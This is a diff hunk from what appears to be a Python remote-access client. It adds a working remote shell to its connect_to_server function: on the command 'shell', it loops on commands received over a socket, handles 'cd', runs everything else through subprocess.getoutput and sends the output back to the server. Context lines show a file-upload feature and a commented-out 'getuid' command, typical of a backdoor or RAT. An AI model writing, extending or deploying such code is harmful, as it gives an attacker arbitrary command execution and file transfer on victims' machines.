@@ -58,13 +58,34 @@ def connect_to_server():
             print("File uploaded successfully")
             s.send(b"File uploaded successfully")
 
-        # if command.lower() == "shell":
-        #     while True:
-        #         command = s.recv(1024).decode('utf-8')
-        #         if command.lower() == "exit":
-        #             break
-        #         output = subprocess.getoutput(command)
-        #         s.send(output.encode('utf-8'))
+        if command.lower() == "shell":
+            print("Shell opened")
+
+            while True:
+                command = s.recv(1024).decode('utf-8')
+                print(command)
+
+                if command.startswith("cd"):
+                    try:
+                        new_path = command.split(" ")[1]
+                        if not os.path.exists(new_path):
+                            s.send("Directory does not exist".encode('utf-8'))
+                        else:
+                            os.chdir(command.split(" ")[1])
+                            s.send("Directory changed".encode('utf-8'))
+                    except IndexError:
+                        s.send("No directory specified".encode('utf-8'))
+                        continue
+                    continue
+
+                if command.lower() == "exit":
+                    s.send("End of Shell.".encode('utf-8'))
+                    break
+
+                output = subprocess.getoutput(command)
+                if not output:
+                    output = "No output"
+                s.send(output.encode('utf-8'))
         #
         #
         # if command.lower() == "getuid":
